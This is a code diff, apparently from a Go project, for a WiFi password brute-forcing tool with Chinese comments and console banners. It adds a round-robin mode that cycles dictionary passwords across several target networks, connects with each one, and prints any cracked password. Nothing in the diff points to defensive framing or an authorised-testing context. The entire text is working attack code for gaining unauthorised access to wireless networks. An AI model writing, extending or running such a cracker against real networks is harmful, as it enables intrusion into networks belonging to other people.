@@ -94,30 +94,30 @@ func CrackOne(net scanner.WiFiNetwork, passwords []string, cfg CrackConfig) Crac
 }
 
 // ============================================================
-// CrackAll 批量爆破所有目标WiFi
+// CrackAll 批量爆破所有目标WiFi（串行模式）
 // ============================================================
 func CrackAll(targets []scanner.WiFiNetwork, passwords []string, cfg CrackConfig) []CrackResult {
 	results := make([]CrackResult, 0, len(targets))
 
 	fmt.Printf("\n  ╔══════════════════════════════════════════╗\n")
-	fmt.Printf("  ║   WiFi 爆破引擎 v2.0 (Go + 缓存加速)    ║\n")
+	fmt.Printf("  ║   WiFi 爆破引擎 v3.0 (Go + 轮询加速)    ║\n")
 	fmt.Printf("  ║   目标: %d 个 | 字典: %d 条              ║\n", len(targets), len(passwords))
 	fmt.Printf("  ╚══════════════════════════════════════════╝\n\n")
 
-	// 预缓存所有目标网络（一次扫描，后续直接连接，大幅提升速度）
+	// 预缓存所有目标网络
 	fmt.Println("  [*] 预缓存目标网络...")
 	for _, net := range targets {
 		if scanner.CacheTarget(net.SSID) {
 			fmt.Printf("    ✓ %s 已缓存\n", net.SSID)
 		} else {
-			fmt.Printf("    ✗ %s 缓存失败（爆破时自动重试）\n", net.SSID)
+			fmt.Printf("    ✗ %s 缓存失败\n", net.SSID)
 		}
 	}
 	fmt.Println()
 
 	successCount := 0
 	for i, net := range targets {
-		fmt.Printf("  ── 目标 [%d/%d] %s (信号:%d dBm 安全:%s) ──\n",
+		fmt.Printf("  ── 目标 [%d/%d] %s (信号:%d dBm %s) ──\n",
 			i+1, len(targets), net.SSID, net.RSSI, net.Security)
 
 		result := CrackOne(net, passwords, cfg)
@@ -129,7 +129,114 @@ func CrackAll(targets []scanner.WiFiNetwork, passwords []string, cfg CrackConfig
 		fmt.Println()
 	}
 
-	// 打印汇总报告
+	printReport(results, successCount)
+	return results
+}
+
+// ============================================================
+// CrackAllRoundRobin 轮询式批量爆破（同时推进多个WiFi）
+// 每个WiFi轮流尝试batchSize个密码，然后切换到下一个
+// 优势：所有WiFi都在推进，弱密码WiFi能快速被发现
+// ============================================================
+func CrackAllRoundRobin(targets []scanner.WiFiNetwork, passwords []string, cfg CrackConfig, batchSize int) []CrackResult {
+	if batchSize <= 0 {
+		batchSize = 20 // 每轮每个WiFi尝试20个密码
+	}
+
+	fmt.Printf("\n  ╔══════════════════════════════════════════════════╗\n")
+	fmt.Printf("  ║   WiFi 爆破引擎 v3.0 (轮询模式)                 ║\n")
+	fmt.Printf("  ║   目标: %d 个 | 字典: %d 条 | 每轮: %d 条       ║\n", len(targets), len(passwords), batchSize)
+	fmt.Printf("  ╚══════════════════════════════════════════════════╝\n\n")
+
+	// 预缓存
+	fmt.Println("  [*] 预缓存所有目标...")
+	for _, net := range targets {
+		scanner.CacheTarget(net.SSID)
+	}
+
+	// 每个目标的进度
+	type targetState struct {
+		net      scanner.WiFiNetwork
+		progress int  // 已尝试到第几个密码
+		done     bool // 是否已完成（成功或全部尝试完）
+		result   CrackResult
+	}
+
+	states := make([]*targetState, len(targets))
+	for i, net := range targets {
+		states[i] = &targetState{
+			net:    net,
+			result: CrackResult{SSID: net.SSID, BSSID: net.BSSID},
+		}
+	}
+
+	total := len(passwords)
+	round := 0
+	activeCount := len(targets)
+
+	for activeCount > 0 {
+		round++
+		fmt.Printf("\n  ── 第 %d 轮 (活跃: %d/%d) ──\n", round, activeCount, len(targets))
+
+		for _, st := range states {
+			if st.done {
+				continue
+			}
+
+			// 本轮尝试batchSize个密码
+			start := st.progress
+			end := start + batchSize
+			if end > total {
+				end = total
+			}
+
+			scanner.CacheTarget(st.net.SSID)
+
+			for i := start; i < end; i++ {
+				pwd := passwords[i]
+				st.result.Tried = i + 1
+
+				if cfg.Verbose {
+					fmt.Printf("\r    [%s] %d/%d 尝试: %-20s",
+						st.net.SSID, i+1, total, maskPassword(pwd))
+				}
+
+				if scanner.TryConnect(st.net.SSID, pwd) {
+					st.result.Password = pwd
+					st.result.Success = true
+					st.done = true
+					activeCount--
+					scanner.DisconnectWiFi()
+					fmt.Printf("\n    ✓ %s → 密码: %s\n", st.net.SSID, pwd)
+					break
+				}
+
+				if cfg.Delay > 0 {
+					time.Sleep(cfg.Delay)
+				}
+			}
+
+			st.progress = end
+			if st.progress >= total && !st.done {
+				st.done = true
+				activeCount--
+				if cfg.Verbose {
+					fmt.Printf("\n    ✗ %s 未破解 (%d次)\n", st.net.SSID, total)
+				}
+			}
+		}
+	}
+
+	// 收集结果
+	results := make([]CrackResult, len(states))
+	successCount := 0
+	for i, st := range states {
+		results[i] = st.result
+		if st.result.Success {
+			successCount++
+		}
+	}
+
 	printReport(results, successCount)
 	return results
 }
